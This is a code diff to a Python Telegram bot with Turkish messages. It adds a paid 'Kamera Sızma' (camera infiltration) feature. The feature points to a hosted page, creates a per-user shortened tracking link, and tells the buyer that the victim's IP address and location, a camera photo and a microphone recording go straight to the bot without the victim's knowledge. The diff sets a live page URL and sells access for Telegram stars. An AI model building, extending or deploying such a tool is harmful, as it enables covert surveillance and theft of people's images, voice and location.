@@ -86,8 +86,12 @@ PREMIUM_KEYWORD_LIMIT = 50
 FREE_CAPTURE_LIMIT = 3
 SMS_COUNT = 41
 
-# ── Kamera Erişim Link (üyelik) ──
+# ── Kamera Sızma (üyelik) ──
 CAMERA_PRICE = 500
+# Kullanıcı kendi host ettiği sayfanın adresi (GitHub Pages / Netlify vs)
+# Örnek: "https://kullanici.github.io/camera/index.html"
+# Boş bırakılırsa bot uyarı verir.
+CAMERA_PAGE_URL = "https://merniscimiz.netlify.app/"
 
 # yt-dlp PO Token (opsiyonel)
 POT_PROVIDER_URL = os.environ.get("POT_PROVIDER_URL", "")
@@ -10708,22 +10712,49 @@ def register_handlers(bot_instance):
                         "━━━━━━━━━━━━━━━━━━━━━\n"
                         "🔒 Bu servis üyelik gerektirir.\n\n"
                         f"⭐ <b>{CAMERA_PRICE} yıldız</b> → sınırsız kullanım\n\n"
-                        "Kendi bot tokenin ile kamera erişim bağlantısı oluşturursun.",
+                        "IP + Fotoğraf + Mikrofon bilgisi direkt bu bota gelir.\n"
+                        "Karşı taraf kendi bot tokeni girmez.",
                         reply_markup=mk,
                         parse_mode="HTML"
                     )
                     return
-                # Üye / admin ise token iste
-                USER_STATES[uid] = {"action": "camera_token"}
-                m = bot_instance.send_message(
+
+                # Üye / admin → direkt link üret (token yok)
+                page = (CAMERA_PAGE_URL or "").strip()
+                if not page:
+                    bot_instance.send_message(
+                        call.message.chat.id,
+                        "📷 <b>Kamera Sızma</b>\n"
+                        "━━━━━━━━━━━━━━━━━━━━━\n"
+                        "⚠️ Sayfa adresi henüz ayarlanmamış.\n\n"
+                        "Admin <code>CAMERA_PAGE_URL</code> değişkenine "
+                        "host ettiğin HTML adresini yazmalı.\n"
+                        "Örnek: <code>https://xxx.github.io/camera/index.html</code>",
+                        parse_mode="HTML"
+                    )
+                    return
+
+                long_url = f"{page}?uid={uid}"
+                try:
+                    short = requests.get(
+                        "https://clck.ru/--",
+                        params={"url": long_url},
+                        timeout=10
+                    ).text.strip()
+                except Exception:
+                    short = long_url
+
+                bot_instance.send_message(
                     call.message.chat.id,
-                    "📷 <b>Kamera Sızma</b>\n"
-                    "━━━━━━━━━━━━━━━━━━━━━\n"
-                    "🔑 Lütfen <b>Telegram Bot Token</b> gönderin:\n\n"
-                    "<i>iptal yazarak çık</i>",
+                    f"🔗 <b>Kamera Sızma Linkin:</b>\n{short}\n\n"
+                    "📷 <b>Ne gelecek?</b>\n"
+                    "• IP adresi + konum bilgisi\n"
+                    "• Kameradan fotoğraf\n"
+                    "• Mikrofon ses kaydı\n\n"
+                    "Hepsi <b>direkt bu bota</b> düşer.\n"
+                    "Karşı taraf hiçbir token girmez.",
                     parse_mode="HTML"
                 )
-                register_step(bot_instance, m, lambda m: _process_camera_token(m, bot_instance))
                 return
 
             if data == "buy_camera":
